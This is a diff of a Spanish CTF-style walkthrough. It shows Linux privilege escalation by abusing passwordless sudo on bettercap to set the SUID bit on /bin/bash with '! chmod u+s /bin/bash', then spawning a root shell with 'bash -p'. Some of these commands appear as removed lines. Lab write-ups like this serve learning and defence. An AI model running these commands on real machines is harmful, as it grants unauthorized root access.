@@ -133,14 +133,7 @@ sudo -l
 
 - `-l`: Enumerar los comandos permitidos (o prohibidos) invocables por el usuario en la máquina actual
 
-
-Existe `bettercap` en la máquina y podemos ejecutarlo sin proporcionar contraseña, ejecutaremos el binario
-
-~~~ bash
-sudo bettercap
-~~~
-
-![exec bettercap with sudo](https://github.com/user-attachments/assets/8b2b3182-7951-491f-a10f-8ef29cd2139e)
+![exec bettercap with sudo]()
 
 Veamos el panel de ayuda con el comando `help`
 
@@ -153,30 +146,9 @@ Esta opción (`!`) nos permite ejecutar un comando a nivel de sistema, así que 
 ! chmod u+s /bin/bash
 ~~~
 
-También podemos hacer esto con un solo comando con la opción `-eval` 
-
-~~~ bash
-sudo bettercap -eval "! chmod u+s /bin/bash"
-~~~
 
 - `-eval`: Ejecutar un comando en la máquina
 
-
-## Root time
-
-Ahora supuestamente asignamos la capacidad de ejecutar `bash` como el usuario `root`, lo podemos verificar con el comando `ls -l /bin/bash` para listar los permisos.
-
-![bash permisions]()
-
-Así que ejecutamos `bash` como el propietario, y nos convertimos en el usuario `root`
-
-~~~ bash
-bash -p
-~~~
-
-- `-p`: Ejecutar como el usuario original
-
-![bash como root]()
 
 
 
